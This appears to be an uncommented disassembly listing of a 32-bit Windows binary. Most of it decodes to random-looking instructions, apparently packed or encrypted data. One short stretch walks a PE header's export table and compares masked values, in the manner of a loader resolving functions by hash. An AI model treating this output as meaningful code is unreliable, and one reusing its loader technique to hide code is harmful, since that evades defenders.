  416236:	xchg   BYTE PTR [edi],ah
  416238:	or     BYTE PTR [edx+0x42],al
  41623b:	or     BYTE PTR [ecx+0x49],dl
  41623e:	push   0x53796161
  416243:	inc    ebp
  416244:	rcr    al,cl
  416246:	dec    edi
  416247:	gs hlt 
  416249:	aam    0x3d
  41624b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41624c:	jg     0x416200
  41624e:	push   0xffffff89
  416250:	imul   esi,ebp,0xffffff81
  416253:	nop
  416254:	sti    
  416255:	push   cs
  416256:	cld    
  416257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416258:	mov    ebx,0x812ec953
  41625d:	out    dx,eax
  41625e:	add    DWORD PTR [edi+0x12],edx
  416261:	repz sbb BYTE PTR [edx+0x6e2762a9],cl
  416268:	mov    esp,0xfc4f8807
  41626d:	inc    ebp
  41626e:	sub    bh,BYTE PTR ds:0xfdb3f3b7
  416274:	cmp    DWORD PTR [esi+0x3589b2c1],0xffffff9d
  41627b:	iret   
  41627c:	daa    
  41627d:	pushf  
  41627e:	call   0x8a50fc1b
  416283:	daa    
  416284:	pop    es
  416285:	add    al,0x59
  416287:	cmc    
  416288:	outs   dx,BYTE PTR ds:[esi]
  416289:	imul   esp,DWORD PTR [edx],0x3d3f9c42
  41628f:	fist   WORD PTR [esi-0xb]
  416292:	fdivr  DWORD PTR [edx+0x26b51230]
  416298:	dec    edx
  416299:	loope  0x416275
  41629b:	scas   eax,DWORD PTR es:[edi]
  41629c:	call   0x45c9:0x97b4dcce
  4162a3:	pop    esp
  4162a4:	scas   eax,DWORD PTR es:[edi]
  4162a5:	iret   
  4162a6:	out    dx,al
  4162a7:	ror    BYTE PTR [eax-0x21ffeff6],cl
  4162ad:	or     DWORD PTR [ecx],edi
  4162af:	push   0xfd0b5cd
  4162b4:	fcom   QWORD PTR [edi+esi*4+0x6992ffae]
  4162bb:	cmp    eax,0x61d8b684
  4162c0:	cmp    BYTE PTR ds:0x16bfb68f,bl
  4162c6:	call   0x3102a09c
  4162cb:	loopne 0x416258
  4162cd:	iret   
  4162ce:	xor    BYTE PTR [esi+edx*8+0x4f622b7b],dl
  4162d5:	(bad)  [edi]
  4162d7:	add    DWORD PTR [eax-0x7e9423c4],ebp
  4162dd:	sub    eax,0x5a332e12
  4162e2:	jecxz  0x4162fb
  4162e4:	lea    ebp,[eax+edx*2+0x182e6081]
  4162eb:	popf   
  4162ec:	lahf   
  4162ed:	lods   eax,DWORD PTR ds:[esi]
  4162ee:	outs   dx,DWORD PTR ds:[esi]
  4162ef:	fist   WORD PTR [esi-0x32]
  4162f2:	cmp    edx,DWORD PTR [edx-0x68429905]
  4162f8:	scas   al,BYTE PTR es:[edi]
  4162f9:	inc    ebx
  4162fa:	mov    dl,0x23
  4162fc:	test   DWORD PTR [ebp-0x51],edx
  4162ff:	fimul  DWORD PTR [ecx]
  416301:	out    0xfb,al
  416303:	cli    
  416304:	stc    
  416305:	jns    0x416348
  416307:	mov    bl,0xcf
  416309:	call   0x62c4c2b4
  41630e:	push   esp
  41630f:	push   esi
  416310:	or     al,0xc1
  416312:	sbb    dh,ah
  416314:	call   0x2f3a:0xb6f84bce
  41631b:	xor    al,0xff
  41631d:	pop    ds
  41631e:	push   ebx
  41631f:	xlat   BYTE PTR ds:[ebx]
  416320:	cmp    bl,BYTE PTR [esi-0x403c6e90]
  416326:	aam    0x24
  416328:	les    esp,FWORD PTR [eax+ecx*4-0x37]
  41632c:	mov    eax,ds:0xcc67ced0
  416331:	outs   dx,BYTE PTR ds:[esi]
  416332:	test   DWORD PTR [eax+0x3b1150bc],ecx
  416338:	aad    0x17
  41633a:	test   eax,0xb671f8de
  41633f:	in     eax,0xc5
  416341:	and    dl,cl
  416343:	mov    DWORD PTR [ebp-0x1cd92f25],ebp
  416349:	retf   
  41634a:	mov    ch,0x3
  41634c:	cmp    cl,ch
  41634e:	es mov ebx,0x8587c856
  416354:	mov    dh,0x4d
  416356:	mov    dl,0xc4
  416358:	cwde   
  416359:	push   ss
  41635a:	jbe    0x41637e
  41635c:	sbb    al,0xd0
  41635e:	xlat   BYTE PTR ds:[ebx]
  41635f:	inc    esi
  416360:	adc    BYTE PTR [ecx+0x1d10827f],cl
  416366:	ins    DWORD PTR es:[edi],dx
  416367:	ja     0x416324
  416369:	fs (bad) 
  41636b:	loope  0x4163c6
  41636d:	sub    esi,DWORD PTR [edx+esi*8-0xa]
  416371:	adc    al,0x9d
  416373:	pop    es
  416374:	inc    esp
  416375:	ret    0x8628
  416378:	mov    bl,0xaf
  41637a:	aaa    
  41637b:	(bad)  
  41637c:	adc    eax,0x91b4a90a
  416381:	inc    ebx
  416382:	in     eax,0x2f
  416384:	inc    DWORD PTR [esp+ecx*4-0x13]
  416388:	adc    al,0x4e
  41638a:	lods   al,BYTE PTR ds:[esi]
  41638b:	ds ins BYTE PTR es:[edi],dx
  41638d:	into   
  41638e:	inc    edi
  41638f:	xchg   esi,eax
  416390:	adc    al,0x5a
  416392:	(bad)  
  416393:	mul    DWORD PTR [edi-0x47]
  416396:	iret   
  416397:	rcr    ecx,cl
  416399:	fs jae 0x41631d
  41639c:	jmp    0xaa3b5c04
  4163a1:	mov    bh,0x9b
  4163a3:	mov    ebp,0x76e7fca2
  4163a8:	daa    
  4163a9:	mov    esi,0x2af1a527
  4163ae:	push   es
  4163af:	jge    0x41635a
  4163b1:	in     al,dx
  4163b2:	push   cs
  4163b3:	sbb    bh,BYTE PTR [eiz*2+0x3d9df537]
  4163ba:	cmp    DWORD PTR es:[eax+edx*1+0xb],0xffffffdf
  4163c0:	fcom   DWORD PTR [ecx+ebp*2-0x6244b4f6]
  4163c7:	mov    bh,0xf8
  4163c9:	leave  
  4163ca:	mov    ecx,0x173c901a
  4163cf:	xor    eax,0x187ed6b9
  4163d4:	repz cmp DWORD PTR [ebp-0x55],edi
  4163d8:	mov    esp,0x23cac2fd
  4163dd:	je     0x4163cc
  4163df:	retf   
  4163e0:	mov    al,0x5c
  4163e2:	cmp    ch,dl
  4163e4:	shr    DWORD PTR [esi],1
  4163e6:	int3   
  4163e7:	xchg   edi,eax
  4163e8:	jg     0x4163a2
  4163ea:	fistp  DWORD PTR [ecx+0x695e13f2]
  4163f0:	dec    edi
  4163f1:	fcomip st,st(4)
  4163f3:	mov    ebp,0xa7b1998c
  4163f8:	fwait
  4163f9:	pop    edx
  4163fa:	daa    
  4163fb:	push   es
  4163fc:	test   cl,cl
  4163fe:	stos   DWORD PTR es:[edi],eax
  4163ff:	sbb    ch,cl
  416401:	inc    ebx
  416402:	mov    ecx,DWORD PTR [eax+esi*2-0x3117c94d]
  416409:	sar    BYTE PTR [edx],cl
  41640b:	(bad)  
  41640c:	mov    WORD PTR [edx],?
  41640e:	mov    bh,0x53
  416410:	out    0xa1,eax
  416412:	sub    ch,BYTE PTR [ebx]
  416414:	mov    eax,ds:0x23e5340b
  416419:	push   esi
  41641a:	mov    DWORD PTR [eax-0x27],ebx
  41641d:	inc    eax
  41641e:	sbb    ch,BYTE PTR es:[ecx+ebp*4]
  416422:	cmp    al,0xe3
  416424:	rcl    DWORD PTR ds:0x96238fc1,cl
  41642a:	push   ebp
  41642b:	add    al,0xd
  41642d:	push   0x7e
  41642f:	icebp  
  416430:	dec    esp
  416431:	sub    ecx,DWORD PTR [ebp+0x4f]
  416434:	sbb    al,bh
  416436:	imul   esp,DWORD PTR [edi+0x19],0x75
  41643a:	pushf  
  41643b:	stos   BYTE PTR es:[edi],al
  41643c:	dec    ebx
  41643d:	and    bh,BYTE PTR [esp+ebp*4]
  416440:	dec    ebx
  416441:	sub    DWORD PTR [eax-0x3a],esi
  416444:	jge    0x4163cd
  416446:	and    al,0xef
  416448:	inc    ecx
  416449:	fiadd  DWORD PTR [eax+0x63]
  41644c:	jb     0x4163fb
  41644e:	mov    esp,0xd3c46d74
  416453:	xchg   DWORD PTR [edi],ebp
  416455:	out    dx,al
  416456:	fiadd  WORD PTR [edi-0x4b]
  416459:	imul   ebp,DWORD PTR [ecx],0xffffffea
  41645c:	mov    ch,0xd6
  41645e:	lods   al,BYTE PTR ds:[esi]
  41645f:	icebp  
  416460:	xchg   BYTE PTR [edi-0x27],ch
  416463:	(bad)  
  416464:	(bad)  
  416465:	push   0xb12c101a
  41646a:	loopne 0x4164e7
  41646c:	adc    BYTE PTR [edi-0xdbbbf75],dl
  416472:	jnp    0x416488
  416474:	fdivr  QWORD PTR [esi+eax*1-0x3cf04084]
  41647b:	push   edx
  41647c:	loop   0x4164c7
  41647e:	xchg   DWORD PTR [edi+edx*8+0x17],esi
  416482:	cmp    al,BYTE PTR [ebp-0x67]
  416485:	xor    eax,0x23d3563e
  41648a:	cli    
  41648b:	dec    ecx
  41648c:	js     0x4164de
  41648e:	les    esi,FWORD PTR [edi-0x4bebd59a]
  416494:	mov    ds:0xff61f9ad,al
  416499:	push   esi
  41649a:	addr16 mov eax,0x2d53ffe1
  4164a0:	mov    ah,0x1d
  4164a2:	int3   
  4164a3:	jns    0x4164c1
  4164a5:	inc    ebp
  4164a6:	pushf  
  4164a7:	inc    ebp
  4164a8:	add    edi,edx
  4164aa:	dec    esi
  4164ab:	in     al,dx
  4164ac:	push   cs
  4164ad:	cli    
  4164ae:	retf   0x5bab
  4164b1:	add    BYTE PTR [edx+0x7e],bh
  4164b4:	cs jo  0x4164e3
  4164b7:	or     ebx,DWORD PTR [ebp+0x3a]
  4164ba:	enter  0xa9d,0xfd
  4164be:	sti    
  4164bf:	mov    ah,0x1c
  4164c1:	pop    es
  4164c2:	xor    BYTE PTR [ebx+0x69bafb92],al
  4164c8:	add    al,0x78
  4164ca:	push   es
  4164cb:	sub    al,BYTE PTR [edi-0x30]
  4164ce:	dec    eax
  4164cf:	cmp    al,0x3c
  4164d1:	call   0x98c3b070
  4164d6:	ins    BYTE PTR es:[edi],dx
  4164d7:	sub    esi,DWORD PTR [eax-0x52]
  4164da:	xlat   BYTE PTR ds:[ebx]
  4164db:	scas   eax,DWORD PTR es:[edi]
  4164dc:	mov    cl,0xca
  4164de:	inc    esi
  4164df:	jmp    FWORD PTR [ebx]
  4164e1:	scas   eax,DWORD PTR es:[edi]
  4164e2:	sbb    cl,BYTE PTR [edi+0x786d3362]
  4164e8:	jbe    0x41650c
  4164ea:	mov    eax,0xd59a010d
  4164ef:	shr    DWORD PTR [edx-0x2b85c6da],1
  4164f5:	cmp    al,0xee
  4164f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f8:	jg     0x4164e3
  4164fa:	cmp    edx,eax
  4164fc:	fisttp DWORD PTR ds:0x78af3459
  416502:	inc    ecx
  416503:	sub    DWORD PTR ds:0x68e622c8,esp
  416509:	add    bh,BYTE PTR [edx]
  41650b:	daa    
  41650c:	cmp    eax,0xee0e848d
  416511:	cmp    esi,DWORD PTR [edi+0x792c2374]
  416517:	inc    edx
  416518:	cmp    DWORD PTR [edx+0x12d19121],ecx
  41651e:	repnz cld 
  416520:	dec    edi
  416521:	push   ss
  416522:	inc    esp
  416523:	adc    ah,ch
  416525:	ficom  WORD PTR [esi+0x43]
  416528:	xor    BYTE PTR [esi+0x7b1ac5ed],0x1c
  41652f:	inc    edx
  416530:	iret   
  416531:	lea    esi,[edx+edi*2-0x1d559c28]
  416538:	fld    QWORD PTR [eax+0xb2600e4]
  41653e:	pusha  
  41653f:	push   edi
  416540:	cmp    DWORD PTR [ecx+0x6e],esp
  416543:	sar    ebp,cl
  416545:	repz test ebp,esp
  416548:	or     bl,BYTE PTR [edi-0x23c22d0d]
  41654e:	pop    esi
  41654f:	fs push ss
  416551:	or     dh,BYTE PTR [eax]
  416553:	add    DWORD PTR ds:0x49d7d8f0,0xfffffff4
  41655a:	or     dh,al
  41655c:	jo     0x4165d6
  41655e:	arpl   dx,di
  416560:	xchg   DWORD PTR [eax+edx*8-0x43],edx
  416564:	pop    esi
  416565:	push   esp
  416566:	inc    ebx
  416567:	(bad)  [eax+edx*2+0x3578ced3]
  41656e:	loop   0x416506
  416570:	and    DWORD PTR [ebp+0x5468f610],0x62
  416577:	mov    al,ds:0x315f7a5a
  41657c:	push   ebx
  41657d:	fisub  WORD PTR [esi]
  41657f:	or     ebx,ebx
  416581:	and    eax,0x5f75d138
  416586:	ja     0x41658c
  416588:	retf   
  416589:	or     DWORD PTR [edx-0x643d5088],0xfffffff7
  416590:	lock jmp 0x879c38e5
  416596:	(bad)  
  416598:	mov    al,ds:0xabaa587
  41659d:	lods   al,BYTE PTR ds:[esi]
  41659e:	rcr    eax,cl
  4165a0:	cmp    dh,BYTE PTR [ecx]
  4165a2:	shr    BYTE PTR [edx+0x7],cl
  4165a5:	lahf   
  4165a6:	xchg   edx,eax
  4165a7:	mov    esp,0x3fb4e2f
  4165ac:	test   al,0xf3
  4165ae:	mov    ds:0xf165ab68,al
  4165b3:	push   esp
  4165b4:	add    DWORD PTR [esi+ebx*4],eax
  4165b7:	sbb    ebp,DWORD PTR [edi+0x18]
  4165ba:	not    BYTE PTR [ebx-0x7f]
  4165bd:	inc    ebp
  4165be:	and    BYTE PTR [esi],cl
  4165c0:	loope  0x41663b
  4165c2:	inc    ebx
  4165c3:	js     0x41656d
  4165c5:	jl     0x416567
  4165c7:	dec    esp
  4165c8:	mov    dh,BYTE PTR [esi+eiz*8]
  4165cb:	mov    ebp,eax
  4165cd:	stos   DWORD PTR es:[edi],eax
  4165ce:	sub    eax,eax
  4165d0:	nop
  4165d1:	and    DWORD PTR [ebx+0x9],ecx
  4165d4:	stc    
  4165d5:	fwait
  4165d6:	imul   ebx,DWORD PTR [ecx+0x5e],0x38e4c00
  4165dd:	and    ecx,ebp
  4165df:	out    0x4b,al
  4165e1:	push   ebp
  4165e2:	fldcw  WORD PTR [esi-0x4b]
  4165e5:	in     al,dx
  4165e6:	lock shl DWORD PTR [edx+0x31],1
  4165ea:	sahf   
  4165eb:	test   eax,0x59c55149
  4165f0:	sub    dl,BYTE PTR [esi+0x61941304]
  4165f6:	fadd   DWORD PTR [edi-0x7af0ad28]
  4165fc:	and    al,BYTE PTR [eax]
  4165fe:	add    BYTE PTR [eax],al
  416600:	movsx  di,BYTE PTR [eax]
  416604:	mov    ebx,0x3b4b
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    ch,BYTE PTR [ecx-0x24aa1cbc]
  416677:	and    esp,DWORD PTR [ecx+0x62]
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	pop    es
  41667f:	or     ebx,DWORD PTR [ecx-0x4aabbc38]
  416685:	adc    BYTE PTR [esi+ebp*4+0x7e36e5ae],ah
  41668c:	pop    es
  41668d:	fucom  st(7)
  41668f:	gs add al,0x32
  416692:	mov    bh,0x7f
  416694:	push   0x998d001b
  416699:	fld    DWORD PTR [ebx]
  41669b:	mov    al,0xef
  41669d:	in     al,0x82
  41669f:	sti    
  4166a0:	push   0x8
  4166a2:	je     0x4166eb
  4166a4:	pop    ebx
  4166a5:	cmp    eax,0x198fb332
  4166aa:	xor    dh,cl
  4166ac:	sti    
  4166ad:	mov    ch,0xd0
  4166af:	clc    
  4166b0:	mov    eax,ds:0x26b8d16
  4166b5:	sbb    edi,ebp
  4166b7:	loope  0x4166c1
  4166b9:	pusha  
  4166ba:	xlat   BYTE PTR ds:[ebx]
  4166bb:	mov    dh,0x35
  4166bd:	cmp    edx,edi
  4166bf:	div    DWORD PTR [esi-0x62]
  4166c2:	retf   
  4166c3:	sar    BYTE PTR [edx],cl
  4166c5:	repz push es
  4166c7:	fisubr DWORD PTR [edx-0x3e28fa5f]
  4166cd:	and    edi,ebx
  4166cf:	nop
  4166d0:	mov    al,BYTE PTR [edi-0x2dde21a7]
  4166d6:	and    al,0xe0
  4166d8:	xchg   edi,eax
  4166d9:	ror    ch,0xbd
  4166dc:	iret   
  4166dd:	pop    ebx
  4166de:	jmp    0xadb7c1ff
  4166e3:	cdq    
  4166e4:	(bad)  [edi+0x54f915ff]
  4166ea:	jno    0x4166f6
  4166ec:	jmp    FWORD PTR [edx*1-0x79a993db]
  4166f3:	cmc    
  4166f4:	fwait
  4166f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166f6:	mov    cl,0x2c
  4166f8:	lods   al,BYTE PTR ds:[esi]
  4166f9:	cwde   
  4166fa:	push   edi
  4166fb:	sbb    ebp,ebp
  4166fd:	mov    al,0xec
  4166ff:	sub    DWORD PTR [esi],ebx
  416701:	mov    bl,0xac
  416703:	icebp  
  416704:	pop    edx
  416705:	inc    ecx
  416706:	mov    al,ds:0xed9cfe34
  41670b:	and    DWORD PTR [ecx+0xa086e33],edi
  416711:	(bad)  
  416712:	mov    ch,0xd4
  416714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416715:	push   esp
  416716:	mov    eax,ds:0x2f6341d2
  41671b:	fcomp  QWORD PTR ds:0xcc65672
  416721:	mov    al,ds:0xce862c16
  416726:	jbe    0x4166a9
  416728:	push   esi
  416729:	fs cmp eax,edx
  41672c:	data16 jo 0x41676a
  41672f:	dec    ebp
  416730:	sub    eax,ecx
  416732:	stos   DWORD PTR es:[edi],eax
  416733:	call   0xb6c8:0x204fec73
  41673a:	adc    eax,0x44fe2dc3
  41673f:	xchg   ecx,eax
  416740:	and    al,0xe3
  416742:	popa   
  416743:	ja     0x4167a8
  416745:	pushf  
  416746:	ret    0x6a59
  416749:	mov    eax,ds:0x3f0e4d81
  41674e:	scas   eax,DWORD PTR es:[edi]
  41674f:	mov    cl,0x2
  416751:	jne    0x416741
  416753:	push   esi
  416754:	inc    ebp
  416755:	inc    ecx
  416756:	sbb    BYTE PTR [ebp+0x4d],bh
  416759:	mov    ah,0x9c
  41675b:	jmp    0x416783
  41675d:	lahf   
  41675e:	rcl    DWORD PTR [ebx],1
  416760:	jmp    0x4167e0
  416762:	pop    eax
  416763:	xor    dh,BYTE PTR [esi+esi*1+0x63]
  416767:	data16 adc dh,BYTE PTR [eax-0x3e]
  41676b:	call   0xfc14:0xae6fbd10
  416772:	shl    BYTE PTR [eax+0x18],1
  416775:	mov    bl,0x7b
  416777:	test   BYTE PTR [eax+ebx*1+0xba4864],dh
  41677e:	fisubr WORD PTR [ebp-0x68]
  416781:	jg     0x416710
  416783:	pop    es
  416784:	(bad)  
  416785:	imul   ebx,DWORD PTR [ebx-0x26],0xbcb37665
  41678c:	xor    ecx,DWORD PTR [esi-0x5f672056]
  416792:	mov    esi,DWORD PTR [edx-0x6d338892]
  416798:	xor    eax,0x37a6b23d
  41679d:	xor    ah,BYTE PTR [ecx+0x2d]
  4167a0:	or     ecx,DWORD PTR ds:0x19942b6b
  4167a6:	das    
  4167a7:	enter  0xe2bf,0x1d
  4167ab:	aad    0xa3
  4167ad:	mov    ecx,0x63ad3d53
  4167b2:	jg     0x41681a
  4167b4:	cmp    eax,0x459401a7
  4167b9:	bound  ebp,QWORD PTR [edi+0x19]
  4167bc:	es imul edi
  4167bf:	ret    
  4167c0:	sub    BYTE PTR [ebp+0x2b],al
  4167c3:	lods   al,BYTE PTR ds:[esi]
  4167c4:	jl     0x416780
  4167c6:	lock call 0x9712:0x4cca0faa
  4167ce:	xchg   edi,eax
  4167cf:	mov    ds:0xa8cc883f,eax
  4167d4:	cdq    
  4167d5:	mov    cl,0x90
  4167d7:	cmp    BYTE PTR ds:0xc88c87a8,al
  4167dd:	add    al,0xba
  4167df:	popf   
  4167e0:	ins    DWORD PTR es:[edi],dx
  4167e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167e2:	dec    eax
  4167e3:	mov    es:0x456812fe,eax
  4167e9:	dec    ecx
  4167ea:	pop    eax
  4167eb:	xchg   ebp,eax
  4167ec:	sub    esi,DWORD PTR [edi+0xd8755ed]
  4167f2:	push   ebp
  4167f3:	jp     0x416799
  4167f5:	jp     0x4167d4
  4167f7:	jmp    0x2025027f
  4167fc:	xor    DWORD PTR [eax],esp
  4167fe:	mov    eax,DWORD PTR [eax-0x1b]
  416801:	lods   eax,DWORD PTR ds:[esi]
  416802:	push   ss
  416803:	repnz mov es,WORD PTR [eax]
  416806:	push   es
  416807:	xchg   ebx,eax
  416808:	pusha  
  416809:	repz cli 
  41680b:	das    
  41680c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41680d:	out    dx,al
  41680e:	pushf  
  41680f:	jnp    0x416840
  416811:	ret    0xa536
  416814:	xor    esp,DWORD PTR [eax+0x43eb3f74]
  41681a:	jp     0x4167fa
  41681c:	call   DWORD PTR [ecx]
  41681e:	dec    esi
  41681f:	push   ecx
  416820:	and    DWORD PTR [esp+eiz*4-0x17e92da9],edx
  416827:	dec    ebp
  416828:	or     dh,bh
  41682a:	psubb  mm0,QWORD PTR [ebx+eiz*2]
  41682e:	and    BYTE PTR [ebx-0x1e9cfa34],0x90
  416835:	xchg   esi,eax
  416836:	inc    esi
  416837:	jmp    0x4167c8
  416839:	cmp    DWORD PTR [edi+0x4d],edx
  41683c:	pushf  
  41683d:	jge    0x4167bf
  41683f:	xor    BYTE PTR [ecx+eiz*4+0x4e],ah
  416843:	inc    edx
  416844:	dec    ebp
  416845:	mov    ch,0xba
  416847:	sub    edi,DWORD PTR [ecx+0x21272d58]
  41684d:	pop    esi
  41684e:	loope  0x416803
  416850:	xchg   BYTE PTR ds:0x10c47fd5,dh
  416856:	inc    ebp
  416857:	sub    dh,ah
  416859:	shl    DWORD PTR [eax],1
  41685b:	dec    ebx
  41685c:	mov    esi,0x66fe33fc
  416861:	and    edx,esi
  416863:	inc    esp
  416864:	iret   
  416865:	cmp    edx,DWORD PTR ds:[ecx*1+0x23d97613]
  41686d:	loop   0x4168e2
  41686f:	pushf  
  416870:	push   eax
  416871:	mov    edi,0x851e4b6d
  416876:	cmovno esp,DWORD PTR [esi-0x24478092]
  41687d:	cdq    
  41687e:	add    eax,0x4b26f97e
  416883:	ds aaa 
  416885:	sbb    DWORD PTR [ecx-0x699cb64f],esp
  41688b:	pandn  mm4,mm3
  41688e:	mov    cl,0xbb
  416890:	pop    edi
  416891:	mov    ds:0xe21abd00,al
  416896:	daa    
  416897:	inc    esp
  416898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416899:	ret    
  41689a:	lea    ebx,[ecx-0x4b7ce9d5]
  4168a0:	adc    al,0x43
  4168a2:	lahf   
  4168a3:	xchg   esi,eax
  4168a4:	xlat   BYTE PTR ds:[ebx]
  4168a5:	jge    0x41689d
  4168a7:	mov    eax,0x30826b3a
  4168ac:	add    al,0xe
  4168ae:	stc    
  4168af:	das    
  4168b0:	sbb    eax,0xcf268e88
  4168b5:	ja     0x416914
  4168b7:	push   ds
  4168b8:	loopne 0x4168ad
  4168ba:	in     eax,dx
  4168bb:	sub    BYTE PTR [ecx-0x7e],al
  4168be:	js     0x416846
  4168c0:	add    dl,BYTE PTR [ebx]
  4168c2:	mov    ecx,0x3e23988f
  4168c7:	xchg   ebp,eax
  4168c8:	(bad)  
  4168ca:	adc    al,0xb7
  4168cc:	adc    eax,0x4f43f695
  4168d1:	mov    al,0xce
  4168d3:	sti    
  4168d4:	into   
  4168d5:	inc    edi
  4168d6:	adc    eax,0xa1fe498f
  4168db:	mov    ah,0x44
  4168dd:	mov    esp,0xff25e7b2
  4168e2:	xor    cl,al
  4168e4:	rol    DWORD PTR [edi+0x1c],0x37
  4168e8:	daa    
  4168e9:	cmp    cl,BYTE PTR [ebx+0x1745b5e3]
  4168ef:	or     al,BYTE PTR [edx+0x77276361]
  4168f5:	mov    bh,0xfc
  4168f7:	push   edi
  4168f8:	rcl    DWORD PTR [eax],cl
  4168fa:	fidivr DWORD PTR [eax]
  4168fc:	mov    bl,0x32
  4168fe:	outs   dx,DWORD PTR ds:[esi]
  4168ff:	jge    0x41690a
  416901:	ds pop ss
  416903:	jns    0x416928
  416905:	not    DWORD PTR [esi+0x29]
  416908:	call   0x7b07ee29
  41690d:	mov    edi,ecx
  41690f:	xor    eax,0xc2005532
  416914:	jle    0x416898
  416916:	fld    QWORD PTR [ebx+0x22f1b51c]
  41691c:	cmovb  edi,DWORD PTR [eax]
  41691f:	bound  ecx,QWORD PTR [edx+0x3d26ce0b]
  416925:	test   BYTE PTR [esi],ch
  416927:	push   esp
  416928:	mov    eax,0xa4b69af6
  41692d:	test   al,0x60
  41692f:	jno    0x416987
  416931:	inc    ebx
  416932:	iret   
  416933:	js     0x4168f0
  416935:	addr16 sti 
  416937:	jae    0x416919
  416939:	jnp    0x416972
  41693b:	xchg   ecx,eax
  41693c:	cld    
  41693d:	jo     0x41690a
  41693f:	dec    edx
  416940:	rol    BYTE PTR [ebp-0x6d8e7ccf],0xb0
  416947:	pop    ds
  416948:	sahf   
  416949:	jne    0x4169a1
  41694b:	mov    esi,0x4c996671
  416950:	scas   al,BYTE PTR es:[edi]
  416951:	mov    ebx,0xc48ec476
  416956:	cmp    BYTE PTR [ebp-0x65dcbb26],0xb5
  41695d:	je     0x416997
  41695f:	push   ds
  416960:	jp     0x416906
  416962:	test   al,0xd2
  416964:	sbb    DWORD PTR [ecx+ebp*8-0x32792095],esi
  41696b:	mov    esi,0x8f714ba9
  416970:	xor    BYTE PTR [ecx],dh
  416972:	cmp    bh,ch
  416974:	cli    
  416975:	add    dh,BYTE PTR [eax]
  416977:	push   esp
  416978:	outs   dx,BYTE PTR ds:[esi]
  416979:	sahf   
  41697a:	inc    ecx
  41697b:	cdq    
  41697c:	in     eax,dx
  41697d:	xchg   ebp,eax
  41697e:	fs jno 0x416921
  416981:	xchg   esi,eax
  416982:	mov    DWORD PTR [ebx+0x3ac06bd0],ebx
  416988:	inc    edx
  416989:	dec    esi
  41698a:	mov    eax,ds:0xc6b3ab9a
  41698f:	lahf   
  416990:	jns    0x416933
  416992:	shl    DWORD PTR [edx],1
  416994:	add    ebx,DWORD PTR [esi-0x4a56ab4f]
  41699a:	rcl    BYTE PTR [edx+0x58],0x9d
  41699e:	sub    al,0xb
  4169a0:	cld    
  4169a1:	push   0x6b
  4169a3:	sub    DWORD PTR es:0xe2c2bd1b,0xffffffb1
  4169ab:	cdq    
  4169ac:	xchg   ecx,ebp
  4169ae:	shl    DWORD PTR [edi],1
  4169b0:	pop    es
  4169b1:	jns    0x4169d4
  4169b3:	ins    BYTE PTR es:[edi],dx
  4169b4:	and    BYTE PTR [edi+0x77be3693],0x22
  4169bb:	push   ss
  4169bc:	adc    DWORD PTR [esi],esp
  4169be:	dec    eax
  4169bf:	and    al,0xae
  4169c1:	jbe    0x416a2a
  4169c3:	lock and eax,0xe304cf05
  4169c9:	lock pop ds
  4169cb:	or     BYTE PTR [eax+0x1429ee72],ah
  4169d1:	stc    
  4169d2:	xor    al,0xfc
  4169d4:	jle    0x4169b4
  4169d6:	inc    eax
  4169d7:	sbb    esp,DWORD PTR [ebx+0x9bee7c]
  4169dd:	and    al,0x8c
  4169df:	jle    0x4169c2
  4169e1:	and    BYTE PTR [ebx+0x5b],ah
  4169e4:	mov    ah,bl
  4169e6:	jnp    0x4169a4
  4169e8:	jno    0x4169f9
  4169ea:	out    0x48,al
  4169ec:	jge    0x416a49
  4169ee:	imul   edx,DWORD PTR [ebx],0x7d
  4169f1:	pop    ebx
  4169f2:	push   ds
  4169f3:	clc    
  4169f4:	popa   
  4169f5:	stc    
  4169f6:	inc    ecx
  4169f7:	push   ebp
  4169f8:	inc    esi
  4169f9:	ficomp WORD PTR [eax-0x3f028e36]
  4169ff:	cmc    
  416a00:	ins    BYTE PTR es:[edi],dx
  416a01:	and    dh,0xb9
  416a04:	sbb    al,0x4a
  416a06:	inc    ebp
  416a07:	lahf   
  416a08:	mov    BYTE PTR [esi],al
  416a0a:	dec    edi
  416a0b:	dec    ecx
  416a0c:	loopne 0x4169fd
  416a0e:	add    al,0x9a
  416a10:	mov    dh,0x31
  416a12:	fld    DWORD PTR [edx+0x3931f80c]
  416a18:	ror    DWORD PTR [ecx-0x4],cl
  416a1b:	push   ds
  416a1c:	arpl   WORD PTR [edi-0x7743d309],si
  416a22:	mov    al,0xca
  416a24:	sub    BYTE PTR [esi+ebx*2],ch
  416a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a28:	mov    ch,BYTE PTR [edx+edi*4-0x5f3dc736]
  416a2f:	dec    ebx
  416a30:	lea    edi,ds:0x890e3fec
  416a36:	sub    al,0xa3
  416a38:	cmp    bl,cl
  416a3a:	add    BYTE PTR [ecx+0x30],al
  416a3d:	stos   DWORD PTR es:[edi],eax
